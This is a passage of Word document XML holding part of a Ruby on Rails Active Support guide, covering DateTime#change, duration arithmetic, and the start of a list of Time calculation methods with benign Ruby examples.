      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>16.1.3 Changing Components</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3041A54A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>change</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> allows you to get a new datetime which is the same as the receiver except for the given options, which may include </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:year</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:month</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:day</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:hour</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:min</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:sec</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:offset</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:start</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6335"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="69A556CE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="616ECF83" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now = DateTime.current</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="731BC74D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Tue, 08 Jun 2010 01:56:22 +0000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0BB9D8B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.change(:year</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2011, :offset</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; Rational(-6, 24))</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73BB0B17" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Wed, 08 Jun 2011 01:56:22 -0600</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="07001AF2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If hours are zeroed, then minutes and seconds are too (unless they have given values):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1AC2D71F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A165DED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.change(:hour</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="371E26CA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Tue, 08 Jun 2010 00:00:00 +0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3FC37B88" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Similarly, if minutes are zeroed, then seconds are too (unless it has given a value):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5F31BB61" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4966DDE2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now.change(:min</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 0)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A5AF9E7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Tue, 08 Jun 2010 01:00:00 +0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="11EE5561" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This method is not tolerant to non-existing dates, if the change is invalid </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ArgumentError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is raised:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5615"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="078E3EFE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F4E153E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>DateTime.current.change(:month</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2, :day</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 30)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7191F5C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; ArgumentError: invalid date</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="77134134" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>16.1.4 Durations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B96B2A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Durations can be added to and subtracted from datetimes:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="21C7D160" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C510D17" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now = DateTime.current</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C6FF53D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon, 09 Aug 2010 23:15:17 +0000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E1FDC62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now + 1.year</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6756706B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Tue, 09 Aug 2011 23:15:17 +0000</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A23AA62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>now - 1.week</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="454C78EC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon, 02 Aug 2010 23:15:17 +0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="09B808F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">They translate to calls to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>since</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>advance</w:t>
      </w:r>
      <w:r>
        <w:t>. For example here we get the correct jump in the calendar reform:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4560"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3BED1B91" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="743CFBAA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>DateTime.new(1582, 10, 4, 23) + 1.hour</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="628FA656" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Fri, 15 Oct 1582 00:00:00 +0000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="124759DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">17 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564EC14F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>17.1 Calculations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265AC79F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">All the following methods are defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/time/calculations.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03A8E307" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support adds to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> many of the methods available for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="278BE8B2" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="011A22DE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>past?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62B84F46" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>today?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53C62C36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>future?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="749AFB9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>yesterday</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78B3BABB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>tomorrow</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="220F8C26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>seconds_since_midnight</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49805D27" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C8288B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>advance</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16C3D5BC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ago</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="71EB4D6F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>since (in)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B0687BE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>beginning_of_day (midnight, at_midnight, at_beginning_of_day)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74927DEE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end_of_day</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32F601AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>beginning_of_week (at_beginning_of_week)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22AB518B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end_of_week (at_end_of_week)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21641977" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>monday</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1831A726" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>sunday</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43E62A21" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>weeks_ago</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FEB1F35" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>prev_week (last_week)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A1931AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>next_week</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2393E31D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>months_ago</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B7C8F85" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>months_since</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="749AE629" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>beginning_of_month (at_beginning_of_month)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="757CB50B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end_of_month (at_end_of_month)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C3A5477" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>prev_month (last_month)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74C7419A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>next_month</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B2CB220" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>beginning_of_quarter (at_beginning_of_quarter)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CBA2ECC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end_of_quarter (at_end_of_quarter)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DA2124A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
